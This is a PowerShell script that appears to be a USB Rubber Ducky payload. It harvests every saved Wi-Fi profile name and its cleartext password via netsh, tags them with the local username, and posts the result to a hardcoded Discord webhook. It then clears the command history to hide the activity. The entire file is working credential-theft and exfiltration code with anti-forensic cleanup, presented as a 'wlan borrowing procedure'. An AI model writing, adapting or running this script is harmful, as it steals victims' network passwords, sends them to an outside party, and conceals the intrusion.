$currentDateTime = Get-Date -Format "dd/MM/yyyy HH:mm"
$username = "Ducky Bot | " + $currentDateTime

# Initialize content
$messageContent = ""

$hasPrivileges = $false
netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    # Extract the Wi-Fi profile name
    $wlanProfile  = $_.Matches.Value.Trim()
    
    # Get the password for the Wi-Fi profile
    $passw = (netsh wlan show profile $wlanProfile key=clear | Select-String '(?<=Key Content\s+:\s).+').Matches.Value
    
    # Check if the password exists (length > 0)
    if ($passw.Length -gt 0) {
        $hasPrivileges = $true
        
        # Append each Wi-Fi profile's details to the message content
        $messageContent += "Wlan SSID: " + [string]$wlanProfile + "`rPassword: " + [string]$passw + "`rUser: " + $env:username + "`r----------------------`r"
    }
}

if (-Not $hasPrivileges) {
    $messageContent += "This user seems not to have required privileges or has no saved wifi passwords`r"
}

# Append the final message indicating the end of the procedure
$messageContent += "`rEnd of wlan borrowing procedure`r-----------------------------------------`r-----------------------------------------`r-----------------------------------------"

# Bundle everything into a single body and send it as one message
$Body = @{
    'username' = $username
    'content' = $messageContent
}

# Send the bundled message to the Discord webhook
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discord.com/api/webhooks/1299047146456088637/g__uJpm_Yj7512QOVyxYE-Cz0Ev_Akzo5UrLyXaCiBLbXMbIpCKevYxgfI3aVWOt6nW2 -Method Post -Body ($Body | ConvertTo-Json)

# Clear the PowerShell command history
Clear-History
